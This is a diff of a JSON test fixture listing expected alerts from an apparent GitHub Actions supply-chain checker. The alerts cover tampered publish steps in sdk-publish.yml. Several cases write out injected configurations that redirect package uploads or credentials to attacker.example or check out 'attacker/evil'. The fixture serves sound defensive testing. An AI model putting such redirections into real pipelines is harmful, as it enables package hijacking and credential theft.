@@ -314,7 +314,7 @@
     "sdk-publish.yml: pack-crates step injected: reads $FOO, which no env: of its step, job or workflow defines"
   ],
   "gem pushing another file": [
-    "sdk-publish.yml: publish-rubygems step injected: a credentialed job runs `gem push \"./release/x.gem\"`: gem push uploads only ./release/${ARTIFACT}"
+    "sdk-publish.yml: publish-rubygems step injected: a credentialed job runs `gem push \"./release/x.gem\" --host https://rubygems.org`: gem push uploads only ./release/${ARTIFACT}"
   ],
   "dotnet pushing another file": [
     "sdk-publish.yml: publish-nuget step injected: a credentialed job runs `dotnet nuget push \"./release/x.nupkg\" --source https://api.nuget.org/v3/index.json`: dotnet nuget push uploads only ./release/${UNIT_COORDINATES}.${UNIT_VERSION}.nupkg"
@@ -666,10 +666,13 @@
     "sdk-publish.yml: publish-pypi: action 2 is {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\",\"repository-url\":\"https://attacker.example/legacy/\"}}, ACTION_SURFACE records {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\"}}"
   ],
   "C2 rubygems gem-server to an attacker": [
-    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\",\"with\":{\"gem-server\":\"https://attacker.example\"}}, ACTION_SURFACE records {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\"}"
+    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"9d194403d6ae779c8e1219f693931e9880da868a7ec813ddfc8c8092ea5dacc4\"}}}, ACTION_SURFACE records {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"de1458446b6c20486841e7ee605985bb639526ed84317d83ca77217a29a031ee\"}}}"
   ],
   "C2b rubygems audience override": [
-    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\",\"with\":{\"audience\":\"attacker.example\"}}, ACTION_SURFACE records {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\"}"
+    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"5891c805324128c2cdb7468571042317944d9f4f0b28f4f738466b5546c27dc8\"}}}, ACTION_SURFACE records {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"de1458446b6c20486841e7ee605985bb639526ed84317d83ca77217a29a031ee\"}}}"
+  ],
+  "C2c rubygems owner override": [
+    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"413ced4c3feab7bc40c80df2ab705bb16dde7582acb7abdc8df5df67fddfaf97\"}}}, ACTION_SURFACE records {\"uses\":\"actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b\",\"with\":{\"script\":{\"sha256\":\"de1458446b6c20486841e7ee605985bb639526ed84317d83ca77217a29a031ee\"}}}"
   ],
   "C3 maven checkout of another repository": [
     "sdk-publish.yml: publish-maven: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"ref\":\"main\",\"repository\":\"attacker/evil\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
